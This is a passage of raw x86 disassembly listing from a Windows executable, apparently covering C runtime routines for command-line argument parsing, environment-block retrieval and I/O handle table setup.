  404ef1:	83 c2 01             	add    $0x1,%edx
  404ef4:	89 55 fc             	mov    %edx,-0x4(%ebp)
  404ef7:	8b 45 18             	mov    0x18(%ebp),%eax
  404efa:	8b 08                	mov    (%eax),%ecx
  404efc:	83 c1 01             	add    $0x1,%ecx
  404eff:	8b 55 18             	mov    0x18(%ebp),%edx
  404f02:	89 0a                	mov    %ecx,(%edx)
  404f04:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  404f08:	74 13                	je     0x404f1d
  404f0a:	8b 45 10             	mov    0x10(%ebp),%eax
  404f0d:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404f10:	8a 11                	mov    (%ecx),%dl
  404f12:	88 10                	mov    %dl,(%eax)
  404f14:	8b 45 10             	mov    0x10(%ebp),%eax
  404f17:	83 c0 01             	add    $0x1,%eax
  404f1a:	89 45 10             	mov    %eax,0x10(%ebp)
  404f1d:	e9 72 ff ff ff       	jmp    0x404e94
  404f22:	8b 4d 18             	mov    0x18(%ebp),%ecx
  404f25:	8b 11                	mov    (%ecx),%edx
  404f27:	83 c2 01             	add    $0x1,%edx
  404f2a:	8b 45 18             	mov    0x18(%ebp),%eax
  404f2d:	89 10                	mov    %edx,(%eax)
  404f2f:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  404f33:	74 0f                	je     0x404f44
  404f35:	8b 4d 10             	mov    0x10(%ebp),%ecx
  404f38:	c6 01 00             	movb   $0x0,(%ecx)
  404f3b:	8b 55 10             	mov    0x10(%ebp),%edx
  404f3e:	83 c2 01             	add    $0x1,%edx
  404f41:	89 55 10             	mov    %edx,0x10(%ebp)
  404f44:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404f47:	0f be 08             	movsbl (%eax),%ecx
  404f4a:	83 f9 22             	cmp    $0x22,%ecx
  404f4d:	75 09                	jne    0x404f58
  404f4f:	8b 55 fc             	mov    -0x4(%ebp),%edx
  404f52:	83 c2 01             	add    $0x1,%edx
  404f55:	89 55 fc             	mov    %edx,-0x4(%ebp)
  404f58:	e9 cf 00 00 00       	jmp    0x40502c
  404f5d:	8b 45 18             	mov    0x18(%ebp),%eax
  404f60:	8b 08                	mov    (%eax),%ecx
  404f62:	83 c1 01             	add    $0x1,%ecx
  404f65:	8b 55 18             	mov    0x18(%ebp),%edx
  404f68:	89 0a                	mov    %ecx,(%edx)
  404f6a:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  404f6e:	74 13                	je     0x404f83
  404f70:	8b 45 10             	mov    0x10(%ebp),%eax
  404f73:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404f76:	8a 11                	mov    (%ecx),%dl
  404f78:	88 10                	mov    %dl,(%eax)
  404f7a:	8b 45 10             	mov    0x10(%ebp),%eax
  404f7d:	83 c0 01             	add    $0x1,%eax
  404f80:	89 45 10             	mov    %eax,0x10(%ebp)
  404f83:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404f86:	8a 11                	mov    (%ecx),%dl
  404f88:	88 55 f4             	mov    %dl,-0xc(%ebp)
  404f8b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404f8e:	83 c0 01             	add    $0x1,%eax
  404f91:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404f94:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  404f97:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  404f9d:	33 d2                	xor    %edx,%edx
  404f9f:	8a 91 21 f1 45 00    	mov    0x45f121(%ecx),%dl
  404fa5:	83 e2 04             	and    $0x4,%edx
  404fa8:	85 d2                	test   %edx,%edx
  404faa:	74 2f                	je     0x404fdb
  404fac:	8b 45 18             	mov    0x18(%ebp),%eax
  404faf:	8b 08                	mov    (%eax),%ecx
  404fb1:	83 c1 01             	add    $0x1,%ecx
  404fb4:	8b 55 18             	mov    0x18(%ebp),%edx
  404fb7:	89 0a                	mov    %ecx,(%edx)
  404fb9:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  404fbd:	74 13                	je     0x404fd2
  404fbf:	8b 45 10             	mov    0x10(%ebp),%eax
  404fc2:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404fc5:	8a 11                	mov    (%ecx),%dl
  404fc7:	88 10                	mov    %dl,(%eax)
  404fc9:	8b 45 10             	mov    0x10(%ebp),%eax
  404fcc:	83 c0 01             	add    $0x1,%eax
  404fcf:	89 45 10             	mov    %eax,0x10(%ebp)
  404fd2:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404fd5:	83 c1 01             	add    $0x1,%ecx
  404fd8:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  404fdb:	8b 55 f4             	mov    -0xc(%ebp),%edx
  404fde:	81 e2 ff 00 00 00    	and    $0xff,%edx
  404fe4:	83 fa 20             	cmp    $0x20,%edx
  404fe7:	74 1e                	je     0x405007
  404fe9:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404fec:	25 ff 00 00 00       	and    $0xff,%eax
  404ff1:	85 c0                	test   %eax,%eax
  404ff3:	74 12                	je     0x405007
  404ff5:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  404ff8:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  404ffe:	83 f9 09             	cmp    $0x9,%ecx
  405001:	0f 85 56 ff ff ff    	jne    0x404f5d
  405007:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40500a:	81 e2 ff 00 00 00    	and    $0xff,%edx
  405010:	85 d2                	test   %edx,%edx
  405012:	75 0b                	jne    0x40501f
  405014:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405017:	83 e8 01             	sub    $0x1,%eax
  40501a:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40501d:	eb 0d                	jmp    0x40502c
  40501f:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  405023:	74 07                	je     0x40502c
  405025:	8b 4d 10             	mov    0x10(%ebp),%ecx
  405028:	c6 41 ff 00          	movb   $0x0,-0x1(%ecx)
  40502c:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  405033:	8b 55 fc             	mov    -0x4(%ebp),%edx
  405036:	0f be 02             	movsbl (%edx),%eax
  405039:	85 c0                	test   %eax,%eax
  40503b:	74 21                	je     0x40505e
  40503d:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405040:	0f be 11             	movsbl (%ecx),%edx
  405043:	83 fa 20             	cmp    $0x20,%edx
  405046:	74 0b                	je     0x405053
  405048:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40504b:	0f be 08             	movsbl (%eax),%ecx
  40504e:	83 f9 09             	cmp    $0x9,%ecx
  405051:	75 0b                	jne    0x40505e
  405053:	8b 55 fc             	mov    -0x4(%ebp),%edx
  405056:	83 c2 01             	add    $0x1,%edx
  405059:	89 55 fc             	mov    %edx,-0x4(%ebp)
  40505c:	eb df                	jmp    0x40503d
  40505e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405061:	0f be 08             	movsbl (%eax),%ecx
  405064:	85 c9                	test   %ecx,%ecx
  405066:	75 05                	jne    0x40506d
  405068:	e9 de 01 00 00       	jmp    0x40524b
  40506d:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  405071:	74 11                	je     0x405084
  405073:	8b 55 0c             	mov    0xc(%ebp),%edx
  405076:	8b 45 10             	mov    0x10(%ebp),%eax
  405079:	89 02                	mov    %eax,(%edx)
  40507b:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40507e:	83 c1 04             	add    $0x4,%ecx
  405081:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  405084:	8b 55 14             	mov    0x14(%ebp),%edx
  405087:	8b 02                	mov    (%edx),%eax
  405089:	83 c0 01             	add    $0x1,%eax
  40508c:	8b 4d 14             	mov    0x14(%ebp),%ecx
  40508f:	89 01                	mov    %eax,(%ecx)
  405091:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  405098:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  40509f:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4050a2:	0f be 02             	movsbl (%edx),%eax
  4050a5:	83 f8 5c             	cmp    $0x5c,%eax
  4050a8:	75 14                	jne    0x4050be
  4050aa:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4050ad:	83 c1 01             	add    $0x1,%ecx
  4050b0:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4050b3:	8b 55 f0             	mov    -0x10(%ebp),%edx
  4050b6:	83 c2 01             	add    $0x1,%edx
  4050b9:	89 55 f0             	mov    %edx,-0x10(%ebp)
  4050bc:	eb e1                	jmp    0x40509f
  4050be:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4050c1:	0f be 08             	movsbl (%eax),%ecx
  4050c4:	83 f9 22             	cmp    $0x22,%ecx
  4050c7:	75 51                	jne    0x40511a
  4050c9:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4050cc:	33 d2                	xor    %edx,%edx
  4050ce:	b9 02 00 00 00       	mov    $0x2,%ecx
  4050d3:	f7 f1                	div    %ecx
  4050d5:	85 d2                	test   %edx,%edx
  4050d7:	75 39                	jne    0x405112
  4050d9:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  4050dd:	74 20                	je     0x4050ff
  4050df:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4050e2:	0f be 42 01          	movsbl 0x1(%edx),%eax
  4050e6:	83 f8 22             	cmp    $0x22,%eax
  4050e9:	75 0b                	jne    0x4050f6
  4050eb:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4050ee:	83 c1 01             	add    $0x1,%ecx
  4050f1:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4050f4:	eb 07                	jmp    0x4050fd
  4050f6:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  4050fd:	eb 07                	jmp    0x405106
  4050ff:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  405106:	33 d2                	xor    %edx,%edx
  405108:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  40510c:	0f 94 c2             	sete   %dl
  40510f:	89 55 ec             	mov    %edx,-0x14(%ebp)
  405112:	8b 45 f0             	mov    -0x10(%ebp),%eax
  405115:	d1 e8                	shr    $1,%eax
  405117:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40511a:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40511d:	8b 55 f0             	mov    -0x10(%ebp),%edx
  405120:	83 ea 01             	sub    $0x1,%edx
  405123:	89 55 f0             	mov    %edx,-0x10(%ebp)
  405126:	85 c9                	test   %ecx,%ecx
  405128:	74 24                	je     0x40514e
  40512a:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  40512e:	74 0f                	je     0x40513f
  405130:	8b 45 10             	mov    0x10(%ebp),%eax
  405133:	c6 00 5c             	movb   $0x5c,(%eax)
  405136:	8b 4d 10             	mov    0x10(%ebp),%ecx
  405139:	83 c1 01             	add    $0x1,%ecx
  40513c:	89 4d 10             	mov    %ecx,0x10(%ebp)
  40513f:	8b 55 18             	mov    0x18(%ebp),%edx
  405142:	8b 02                	mov    (%edx),%eax
  405144:	83 c0 01             	add    $0x1,%eax
  405147:	8b 4d 18             	mov    0x18(%ebp),%ecx
  40514a:	89 01                	mov    %eax,(%ecx)
  40514c:	eb cc                	jmp    0x40511a
  40514e:	8b 55 fc             	mov    -0x4(%ebp),%edx
  405151:	0f be 02             	movsbl (%edx),%eax
  405154:	85 c0                	test   %eax,%eax
  405156:	74 1c                	je     0x405174
  405158:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  40515c:	75 1b                	jne    0x405179
  40515e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405161:	0f be 11             	movsbl (%ecx),%edx
  405164:	83 fa 20             	cmp    $0x20,%edx
  405167:	74 0b                	je     0x405174
  405169:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40516c:	0f be 08             	movsbl (%eax),%ecx
  40516f:	83 f9 09             	cmp    $0x9,%ecx
  405172:	75 05                	jne    0x405179
  405174:	e9 ab 00 00 00       	jmp    0x405224
  405179:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  40517d:	0f 84 93 00 00 00    	je     0x405216
  405183:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  405187:	74 54                	je     0x4051dd
  405189:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40518c:	33 c0                	xor    %eax,%eax
  40518e:	8a 02                	mov    (%edx),%al
  405190:	33 c9                	xor    %ecx,%ecx
  405192:	8a 88 21 f1 45 00    	mov    0x45f121(%eax),%cl
  405198:	83 e1 04             	and    $0x4,%ecx
  40519b:	85 c9                	test   %ecx,%ecx
  40519d:	74 29                	je     0x4051c8
  40519f:	8b 55 10             	mov    0x10(%ebp),%edx
  4051a2:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4051a5:	8a 08                	mov    (%eax),%cl
  4051a7:	88 0a                	mov    %cl,(%edx)
  4051a9:	8b 55 10             	mov    0x10(%ebp),%edx
  4051ac:	83 c2 01             	add    $0x1,%edx
  4051af:	89 55 10             	mov    %edx,0x10(%ebp)
  4051b2:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4051b5:	83 c0 01             	add    $0x1,%eax
  4051b8:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4051bb:	8b 4d 18             	mov    0x18(%ebp),%ecx
  4051be:	8b 11                	mov    (%ecx),%edx
  4051c0:	83 c2 01             	add    $0x1,%edx
  4051c3:	8b 45 18             	mov    0x18(%ebp),%eax
  4051c6:	89 10                	mov    %edx,(%eax)
  4051c8:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4051cb:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4051ce:	8a 02                	mov    (%edx),%al
  4051d0:	88 01                	mov    %al,(%ecx)
  4051d2:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4051d5:	83 c1 01             	add    $0x1,%ecx
  4051d8:	89 4d 10             	mov    %ecx,0x10(%ebp)
  4051db:	eb 2c                	jmp    0x405209
  4051dd:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4051e0:	33 c0                	xor    %eax,%eax
  4051e2:	8a 02                	mov    (%edx),%al
  4051e4:	33 c9                	xor    %ecx,%ecx
  4051e6:	8a 88 21 f1 45 00    	mov    0x45f121(%eax),%cl
  4051ec:	83 e1 04             	and    $0x4,%ecx
  4051ef:	85 c9                	test   %ecx,%ecx
  4051f1:	74 16                	je     0x405209
  4051f3:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4051f6:	83 c2 01             	add    $0x1,%edx
  4051f9:	89 55 fc             	mov    %edx,-0x4(%ebp)
  4051fc:	8b 45 18             	mov    0x18(%ebp),%eax
  4051ff:	8b 08                	mov    (%eax),%ecx
  405201:	83 c1 01             	add    $0x1,%ecx
  405204:	8b 55 18             	mov    0x18(%ebp),%edx
  405207:	89 0a                	mov    %ecx,(%edx)
  405209:	8b 45 18             	mov    0x18(%ebp),%eax
  40520c:	8b 08                	mov    (%eax),%ecx
  40520e:	83 c1 01             	add    $0x1,%ecx
  405211:	8b 55 18             	mov    0x18(%ebp),%edx
  405214:	89 0a                	mov    %ecx,(%edx)
  405216:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405219:	83 c0 01             	add    $0x1,%eax
  40521c:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40521f:	e9 6d fe ff ff       	jmp    0x405091
  405224:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  405228:	74 0f                	je     0x405239
  40522a:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40522d:	c6 01 00             	movb   $0x0,(%ecx)
  405230:	8b 55 10             	mov    0x10(%ebp),%edx
  405233:	83 c2 01             	add    $0x1,%edx
  405236:	89 55 10             	mov    %edx,0x10(%ebp)
  405239:	8b 45 18             	mov    0x18(%ebp),%eax
  40523c:	8b 08                	mov    (%eax),%ecx
  40523e:	83 c1 01             	add    $0x1,%ecx
  405241:	8b 55 18             	mov    0x18(%ebp),%edx
  405244:	89 0a                	mov    %ecx,(%edx)
  405246:	e9 e8 fd ff ff       	jmp    0x405033
  40524b:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  40524f:	74 12                	je     0x405263
  405251:	8b 45 0c             	mov    0xc(%ebp),%eax
  405254:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  40525a:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40525d:	83 c1 04             	add    $0x4,%ecx
  405260:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  405263:	8b 55 14             	mov    0x14(%ebp),%edx
  405266:	8b 02                	mov    (%edx),%eax
  405268:	83 c0 01             	add    $0x1,%eax
  40526b:	8b 4d 14             	mov    0x14(%ebp),%ecx
  40526e:	89 01                	mov    %eax,(%ecx)
  405270:	8b e5                	mov    %ebp,%esp
  405272:	5d                   	pop    %ebp
  405273:	c3                   	ret
  405274:	cc                   	int3
  405275:	cc                   	int3
  405276:	cc                   	int3
  405277:	cc                   	int3
  405278:	cc                   	int3
  405279:	cc                   	int3
  40527a:	cc                   	int3
  40527b:	cc                   	int3
  40527c:	cc                   	int3
  40527d:	cc                   	int3
  40527e:	cc                   	int3
  40527f:	cc                   	int3
  405280:	55                   	push   %ebp
  405281:	8b ec                	mov    %esp,%ebp
  405283:	83 ec 18             	sub    $0x18,%esp
  405286:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  40528d:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  405294:	83 3d 28 de 45 00 00 	cmpl   $0x0,0x45de28
  40529b:	75 3d                	jne    0x4052da
  40529d:	ff 15 80 f0 40 00    	call   *0x40f080
  4052a3:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4052a6:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  4052aa:	74 0c                	je     0x4052b8
  4052ac:	c7 05 28 de 45 00 01 	movl   $0x1,0x45de28
  4052b3:	00 00 00 
  4052b6:	eb 22                	jmp    0x4052da
  4052b8:	ff 15 7c f0 40 00    	call   *0x40f07c
  4052be:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4052c1:	83 7d e8 00          	cmpl   $0x0,-0x18(%ebp)
  4052c5:	74 0c                	je     0x4052d3
  4052c7:	c7 05 28 de 45 00 02 	movl   $0x2,0x45de28
  4052ce:	00 00 00 
  4052d1:	eb 07                	jmp    0x4052da
  4052d3:	33 c0                	xor    %eax,%eax
  4052d5:	e9 bb 01 00 00       	jmp    0x405495
  4052da:	83 3d 28 de 45 00 01 	cmpl   $0x1,0x45de28
  4052e1:	0f 85 f7 00 00 00    	jne    0x4053de
  4052e7:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  4052eb:	75 16                	jne    0x405303
  4052ed:	ff 15 80 f0 40 00    	call   *0x40f080
  4052f3:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4052f6:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  4052fa:	75 07                	jne    0x405303
  4052fc:	33 c0                	xor    %eax,%eax
  4052fe:	e9 92 01 00 00       	jmp    0x405495
  405303:	8b 45 ec             	mov    -0x14(%ebp),%eax
  405306:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405309:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40530c:	33 d2                	xor    %edx,%edx
  40530e:	66 8b 11             	mov    (%ecx),%dx
  405311:	85 d2                	test   %edx,%edx
  405313:	74 20                	je     0x405335
  405315:	8b 45 f8             	mov    -0x8(%ebp),%eax
  405318:	83 c0 02             	add    $0x2,%eax
  40531b:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40531e:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  405321:	33 d2                	xor    %edx,%edx
  405323:	66 8b 11             	mov    (%ecx),%dx
  405326:	85 d2                	test   %edx,%edx
  405328:	75 09                	jne    0x405333
  40532a:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40532d:	83 c0 02             	add    $0x2,%eax
  405330:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405333:	eb d4                	jmp    0x405309
  405335:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  405338:	2b 4d ec             	sub    -0x14(%ebp),%ecx
  40533b:	d1 f9                	sar    $1,%ecx
  40533d:	83 c1 01             	add    $0x1,%ecx
  405340:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  405343:	6a 00                	push   $0x0
  405345:	6a 00                	push   $0x0
  405347:	6a 00                	push   $0x0
  405349:	6a 00                	push   $0x0
  40534b:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40534e:	52                   	push   %edx
  40534f:	8b 45 ec             	mov    -0x14(%ebp),%eax
  405352:	50                   	push   %eax
  405353:	6a 00                	push   $0x0
  405355:	6a 00                	push   $0x0
  405357:	ff 15 78 f0 40 00    	call   *0x40f078
  40535d:	89 45 f0             	mov    %eax,-0x10(%ebp)
  405360:	83 7d f0 00          	cmpl   $0x0,-0x10(%ebp)
  405364:	74 1e                	je     0x405384
  405366:	6a 64                	push   $0x64
  405368:	68 28 f2 40 00       	push   $0x40f228
  40536d:	6a 02                	push   $0x2
  40536f:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  405372:	51                   	push   %ecx
  405373:	e8 68 0a 00 00       	call   0x405de0
  405378:	83 c4 10             	add    $0x10,%esp
  40537b:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40537e:	83 7d e8 00          	cmpl   $0x0,-0x18(%ebp)
  405382:	75 11                	jne    0x405395
  405384:	8b 55 ec             	mov    -0x14(%ebp),%edx
  405387:	52                   	push   %edx
  405388:	ff 15 74 f0 40 00    	call   *0x40f074
  40538e:	33 c0                	xor    %eax,%eax
  405390:	e9 00 01 00 00       	jmp    0x405495
  405395:	6a 00                	push   $0x0
  405397:	6a 00                	push   $0x0
  405399:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40539c:	50                   	push   %eax
  40539d:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  4053a0:	51                   	push   %ecx
  4053a1:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4053a4:	52                   	push   %edx
  4053a5:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4053a8:	50                   	push   %eax
  4053a9:	6a 00                	push   $0x0
  4053ab:	6a 00                	push   $0x0
  4053ad:	ff 15 78 f0 40 00    	call   *0x40f078
  4053b3:	85 c0                	test   %eax,%eax
  4053b5:	75 15                	jne    0x4053cc
  4053b7:	6a 02                	push   $0x2
  4053b9:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  4053bc:	51                   	push   %ecx
  4053bd:	e8 6e 0e 00 00       	call   0x406230
  4053c2:	83 c4 08             	add    $0x8,%esp
  4053c5:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  4053cc:	8b 55 ec             	mov    -0x14(%ebp),%edx
  4053cf:	52                   	push   %edx
  4053d0:	ff 15 74 f0 40 00    	call   *0x40f074
  4053d6:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4053d9:	e9 b7 00 00 00       	jmp    0x405495
  4053de:	83 3d 28 de 45 00 02 	cmpl   $0x2,0x45de28
  4053e5:	0f 85 a8 00 00 00    	jne    0x405493
  4053eb:	83 7d e8 00          	cmpl   $0x0,-0x18(%ebp)
  4053ef:	75 16                	jne    0x405407
  4053f1:	ff 15 7c f0 40 00    	call   *0x40f07c
  4053f7:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4053fa:	83 7d e8 00          	cmpl   $0x0,-0x18(%ebp)
  4053fe:	75 07                	jne    0x405407
  405400:	33 c0                	xor    %eax,%eax
  405402:	e9 8e 00 00 00       	jmp    0x405495
  405407:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40540a:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40540d:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  405410:	0f be 11             	movsbl (%ecx),%edx
  405413:	85 d2                	test   %edx,%edx
  405415:	74 1e                	je     0x405435
  405417:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40541a:	83 c0 01             	add    $0x1,%eax
  40541d:	89 45 f4             	mov    %eax,-0xc(%ebp)
  405420:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  405423:	0f be 11             	movsbl (%ecx),%edx
  405426:	85 d2                	test   %edx,%edx
  405428:	75 09                	jne    0x405433
  40542a:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40542d:	83 c0 01             	add    $0x1,%eax
  405430:	89 45 f4             	mov    %eax,-0xc(%ebp)
  405433:	eb d8                	jmp    0x40540d
  405435:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  405438:	2b 4d e8             	sub    -0x18(%ebp),%ecx
  40543b:	83 c1 01             	add    $0x1,%ecx
  40543e:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  405441:	68 8f 00 00 00       	push   $0x8f
  405446:	68 28 f2 40 00       	push   $0x40f228
  40544b:	6a 02                	push   $0x2
  40544d:	8b 55 f0             	mov    -0x10(%ebp),%edx
  405450:	52                   	push   %edx
  405451:	e8 8a 09 00 00       	call   0x405de0
  405456:	83 c4 10             	add    $0x10,%esp
  405459:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40545c:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  405460:	75 0e                	jne    0x405470
  405462:	8b 45 e8             	mov    -0x18(%ebp),%eax
  405465:	50                   	push   %eax
  405466:	ff 15 70 f0 40 00    	call   *0x40f070
  40546c:	33 c0                	xor    %eax,%eax
  40546e:	eb 25                	jmp    0x405495
  405470:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  405473:	51                   	push   %ecx
  405474:	8b 55 e8             	mov    -0x18(%ebp),%edx
  405477:	52                   	push   %edx
  405478:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40547b:	50                   	push   %eax
  40547c:	e8 3f da ff ff       	call   0x402ec0
  405481:	83 c4 0c             	add    $0xc,%esp
  405484:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  405487:	51                   	push   %ecx
  405488:	ff 15 70 f0 40 00    	call   *0x40f070
  40548e:	8b 45 f4             	mov    -0xc(%ebp),%eax
  405491:	eb 02                	jmp    0x405495
  405493:	33 c0                	xor    %eax,%eax
  405495:	8b e5                	mov    %ebp,%esp
  405497:	5d                   	pop    %ebp
  405498:	c3                   	ret
  405499:	cc                   	int3
  40549a:	cc                   	int3
  40549b:	cc                   	int3
  40549c:	cc                   	int3
  40549d:	cc                   	int3
  40549e:	cc                   	int3
  40549f:	cc                   	int3
  4054a0:	55                   	push   %ebp
  4054a1:	8b ec                	mov    %esp,%ebp
  4054a3:	83 ec 6c             	sub    $0x6c,%esp
  4054a6:	68 81 00 00 00       	push   $0x81
  4054ab:	68 30 f2 40 00       	push   $0x40f230
  4054b0:	6a 02                	push   $0x2
  4054b2:	68 80 04 00 00       	push   $0x480
  4054b7:	e8 24 09 00 00       	call   0x405de0
  4054bc:	83 c4 10             	add    $0x10,%esp
  4054bf:	89 45 b0             	mov    %eax,-0x50(%ebp)
  4054c2:	83 7d b0 00          	cmpl   $0x0,-0x50(%ebp)
  4054c6:	75 0a                	jne    0x4054d2
  4054c8:	6a 1b                	push   $0x1b
  4054ca:	e8 01 df ff ff       	call   0x4033d0
  4054cf:	83 c4 04             	add    $0x4,%esp
  4054d2:	8b 45 b0             	mov    -0x50(%ebp),%eax
  4054d5:	a3 60 f2 45 00       	mov    %eax,0x45f260
  4054da:	c7 05 60 f3 45 00 20 	movl   $0x20,0x45f360
  4054e1:	00 00 00 
  4054e4:	eb 09                	jmp    0x4054ef
  4054e6:	8b 4d b0             	mov    -0x50(%ebp),%ecx
  4054e9:	83 c1 24             	add    $0x24,%ecx
  4054ec:	89 4d b0             	mov    %ecx,-0x50(%ebp)
  4054ef:	8b 15 60 f2 45 00    	mov    0x45f260,%edx
  4054f5:	81 c2 80 04 00 00    	add    $0x480,%edx
  4054fb:	39 55 b0             	cmp    %edx,-0x50(%ebp)
  4054fe:	73 23                	jae    0x405523
  405500:	8b 45 b0             	mov    -0x50(%ebp),%eax
  405503:	c6 40 04 00          	movb   $0x0,0x4(%eax)
  405507:	8b 4d b0             	mov    -0x50(%ebp),%ecx
  40550a:	c7 01 ff ff ff ff    	movl   $0xffffffff,(%ecx)
  405510:	8b 55 b0             	mov    -0x50(%ebp),%edx
  405513:	c6 42 05 0a          	movb   $0xa,0x5(%edx)
  405517:	8b 45 b0             	mov    -0x50(%ebp),%eax
  40551a:	c7 40 08 00 00 00 00 	movl   $0x0,0x8(%eax)
  405521:	eb c3                	jmp    0x4054e6
  405523:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  405526:	51                   	push   %ecx
  405527:	ff 15 20 f0 40 00    	call   *0x40f020
  40552d:	8b 55 ea             	mov    -0x16(%ebp),%edx
  405530:	81 e2 ff ff 00 00    	and    $0xffff,%edx
  405536:	85 d2                	test   %edx,%edx
  405538:	0f 84 87 01 00 00    	je     0x4056c5
  40553e:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  405542:	0f 84 7d 01 00 00    	je     0x4056c5
  405548:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40554b:	8b 08                	mov    (%eax),%ecx
  40554d:	89 4d 9c             	mov    %ecx,-0x64(%ebp)
  405550:	8b 55 ec             	mov    -0x14(%ebp),%edx
  405553:	83 c2 04             	add    $0x4,%edx
  405556:	89 55 fc             	mov    %edx,-0x4(%ebp)
  405559:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40555c:	03 45 9c             	add    -0x64(%ebp),%eax
  40555f:	89 45 a0             	mov    %eax,-0x60(%ebp)
